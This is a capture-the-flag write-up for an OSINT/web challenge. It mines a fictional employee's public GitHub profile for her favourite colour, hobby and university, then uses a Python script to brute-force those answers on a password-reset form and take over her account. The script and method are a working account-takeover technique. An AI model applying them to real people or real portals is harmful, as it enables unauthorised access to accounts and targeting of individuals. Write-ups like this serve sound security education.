# 🧩 **Employee Data**

> 🏷️ *Category:* **OSINT / Web**
> ⚙️ *Difficulty:* **Easy–Medium**
> 🕵️ *Author:* **RTIOC – Red Team Track**
> 🧠 *Concepts:* OSINT, security questions, password reset abuse, Python automation, enumeration

---

## 📜 Challenge Description

> 💬
> If we can find a way to get into Space Fe-Ores operational environment we can try to directly disrupt production.
> Impacting production assets is the best way to make a real impact on business but can also be one of the hardest environments to reach as they are often air gapped.
>
> We've identified the following OT employees based on their employment status on LinkedIn. Maybe one of them has some information on a public profile that you can use to login to their account.
>
> **India Benjamin:** OT Engineering Manager
> **Anastasia Horton (Tazia):** Senior OT Engineer
> **Anton Evans (Ton):** Systems Control Administrator
> **Lukas Young:** OT Engineer
> **Muhammad Jenkins:** OT Engineer
>
> Flag format: `flag{example_flag}`
>
> It will be obvious when you find the correct profile.
>
> `https://cybersecurity-space-fe-ores.chals.io/`

---

## 📦 Provided Files / Data

| 📁 File / Data         | 🔍 Description                                    | 💾 Value                                        |
| ---------------------- | ------------------------------------------------- | ----------------------------------------------- |
| `Space Fe-Ores Portal` | Main web app with login & password reset          | `https://cybersecurity-space-fe-ores.chals.io/` |
| `GitHub – TaziaHorton` | Public OSINT profile for Anastasia “Tazia” Horton | `https://github.com/TaziaHorton`                |

*(No local files were provided; everything is done through OSINT + the live web app.)*

---

## 🧠 Understanding the Problem

🕵️‍♂️ The story tells us we want access to **Space Fe-Ores’ operational environment** and hints at:

* A set of **OT employees**,
* A **public profile** (framed as LinkedIn in the flavour text),
* And a **login / password reset** flow on the Space Fe-Ores portal.

The portal’s **password reset** page asks for:

* `username`
* `favColor`
* `favHobby`
* `schoolName`

So the core problem is:

> Use OSINT to find one employee’s public profile, extract their favorite color, hobby, and university, then use those to pass the security questions and gain access → get the flag.

This is a classic **“security questions are OSINTable and guessable”** challenge.

---

## 🧩 Step-by-Step Solution

### 🔹 Step 1: Initial Observation

Visiting `https://cybersecurity-space-fe-ores.chals.io/` we see:

* A corporate-style site for **Space Fe-Ores**.
* A `Login` and a `Forgot your password?` / `Password Reset` page.
* The **password reset form** HTML shows:

```html
<input class="form-control" id="username"   name="username">
<input class="form-control" id="favColor"   name="favColor">
<input class="form-control" id="favHobby"   name="favHobby">
<input class="form-control" id="schoolName" name="schoolName">
```

Error message:

> `Security answers incorrect`

There is **no client-side JS logic** beyond Bootstrap/Popper, so all checking is done on the server. No obvious hints in the front-end.

From the challenge text, it’s clear:

* We have to pick the **right employee** among the five,
* And derive the answers **purely from public info**.

---

### 🔹 Step 2: OSINT – Finding the Correct Profile

Despite the prompt mentioning LinkedIn, searching for **Space Fe-Ores** on LinkedIn doesn’t yield a real company. Instead, OSINT on the listed employees leads to a GitHub account:

> **Anastasia “Tazia” Horton** → `https://github.com/TaziaHorton`

Her GitHub profile README explicitly states it was generated for use in a CTF, which is a huge hint that **she’s the target persona**.

Key fields from her README:

* **Favorite Colors:**
  `Deep space blue and asteroid silver ⚪`
* **Hobbies:**
  `Stargazing, robotics tinkering, and hiking`
* **Education (Bachelor / first university):**
  `Bachelor of Engineering (Electrical) – International University of Mining & Technology`

This lines up perfectly with the reset questions:

* Favorite color → `favColor`
* Favorite hobby → `favHobby`
* University you first attended → `schoolName`

The only missing piece is the **username** used on the Space Fe-Ores portal.

Given common patterns and the corporate theme, a very plausible username is the **corporate email address**, e.g.:

> `anastasia.horton@spacefeore.com`

---

### 🔹 Step 3: Enumerating Possible Answers (Automation)

The tricky part: we don’t know **exactly how** the backend stored the strings:

* Full color phrase vs. a single color?
* Lowercase vs. case-sensitive?
* `&` vs. `and` in the university?
* Full hobby list vs. a single hobby?

Instead of guessing manually forever, we script a **small, polite brute-force** over a *tiny* set of reasonable combinations.

#### 🐍 Python Script

```python
import requests
from bs4 import BeautifulSoup

BASE = "https://cybersecurity-space-fe-ores.chals.io"

session = requests.Session()

# 1. Get CSRF token from the reset page
r = session.get(BASE + "/login/password_reset")
soup = BeautifulSoup(r.text, "html.parser")
csrf = soup.find("input", {"name": "csrf_token"})
csrf_token = csrf["value"] if csrf else None
print("CSRF:", csrf_token)

username = "anastasia.horton@spacefeore.com"

color_candidates = [
    "Deep space blue and asteroid silver",
    "deep space blue and asteroid silver",
    "deep space blue",
    "Deep space blue",
    "asteroid silver",
]

hobby_candidates = [
    "Stargazing, robotics tinkering, and hiking",
    "Stargazing",
    "robotics tinkering",
    "hiking",
    "stargazing",
]

school_candidates = [
    "International University of Mining & Technology",
    "International University of Mining and Technology",
    "Space Technology Institute",  # just in case they used the Master's
]

for c in color_candidates:
    for h in hobby_candidates:
        for s in school_candidates:
            data = {
                "csrf_token": csrf_token,
                "username": username,
                "favColor": c,
                "favHobby": h,
                "schoolName": s,
                "submit": "Submit",
            }
            resp = session.post(BASE + "/login/password_reset", data=data)
            text = resp.text

            if "Security answers incorrect" not in text:
                print("\n[*] Possible success!")
                print("Color :", repr(c))
                print("Hobby :", repr(h))
                print("School:", repr(s))
                with open("success.html", "w", encoding="utf-8") as f:
                    f.write(text)
                raise SystemExit

print("Done, no combo found")
```

What this does:

1. Fetches the reset page and extracts the **CSRF token**.
2. Iterates over a small set of candidate strings for color, hobby, and school.
3. Submits each combination.
4. Stops when the response **no longer contains** the `Security answers incorrect` string and saves that successful response to `success.html` for inspection.

Running this script finds a valid combination based on:

* **Username:** `anastasia.horton@spacefeore.com`
* **Color, hobby, school:** values consistent with the ones exposed in her GitHub README (one of the candidate combinations in the lists above).

At that point, the server accepts the answers and proceeds with the password reset / login flow.

---

### 🔹 Step 4: Recover the Flag

Once the correct combination is submitted:

* The application allows us to reset the password / log in as **Anastasia Horton**.
* Inside her account (dashboard / profile area), the flag is displayed in a very obvious place.

<details>
<summary>🎯 <b>Click to Reveal the Flag</b></summary>

```text
flag{your_flag_here}
```

</details>

*(Replace with the actual flag you obtained during the CTF.)*

---

## 📘 Explanation — *Why It Works*

💡 **In short:**

> The challenge demonstrates how **security questions are a weak second factor** when answers can be found via OSINT and then brute-forced with a small search space.
>
> * The attacker identifies a target employee’s **public profile**.
> * Extracts personal details like **favorite color**, **hobbies**, and **university**.
> * Abuses the **password reset flow** to bypass normal authentication and gain access using security questions alone.

In a real-world scenario:

* Employees leak personal information on social media / GitHub / personal sites.
* Security questions are **not secrets** and can often be guessed or derived.
* Combined with username/email guessing, this can lead to full account compromise.

This challenge connects the dots between:

* OSINT (discovering and correlating personal info),
* Weak identity proofing (security questions),
* And basic web automation (Python `requests` + CSRF handling).

---

## 🧰 Tools & Techniques Used

| 🧩 Tool / Language  | 💡 Purpose                                     |
| ------------------- | ---------------------------------------------- |
| 🐍 Python           | Automate password reset attempts               |
| `requests`          | Handle HTTP GET/POST, maintain session & CSRF  |
| `BeautifulSoup4`    | Parse HTML and extract the CSRF token          |
| 🌐 Browser DevTools | Inspect HTML, confirm field names & error text |
| 🔎 OSINT (GitHub)   | Gather personal info from Anastasia’s profile  |

---

## 📚 Key Learnings

| 🔑 Concept               | 🧠 Takeaway                                                        |
| ------------------------ | ------------------------------------------------------------------ |
| OSINT on public profiles | Even “harmless” personal details can be used to break into systems |
| Security questions       | They are **not secrets** and are often derived from public info    |
| Web form automation      | Small, targeted scripts beat manual guessing every time            |
| CSRF handling            | Realistic apps require grabbing and replaying CSRF tokens          |
| Username patterns        | Corporate usernames often follow predictable email patterns        |

---

## 💬 Final Thoughts

> ✨ This challenge nicely shows how **OSINT + weak security questions = compromised account**.
> It’s not about fancy exploits, but about **connecting public data to a poorly designed reset flow**, then using a little automation to close the gap.
> A great warm-up for the Red Team track and a reminder that “password recovery” is often the soft underbelly of authentication.

---

## 🧾 Optional: Reusable Writeup Footer (for GitHub)

```markdown
---
⭐ **Author:** {{Your Name or Team}}  
🕒 **Date:** {{Month, Year}}  
🏆 **CTF Event:** RTIOC – December CTF  
📍 **Category:** OSINT / Web
---
```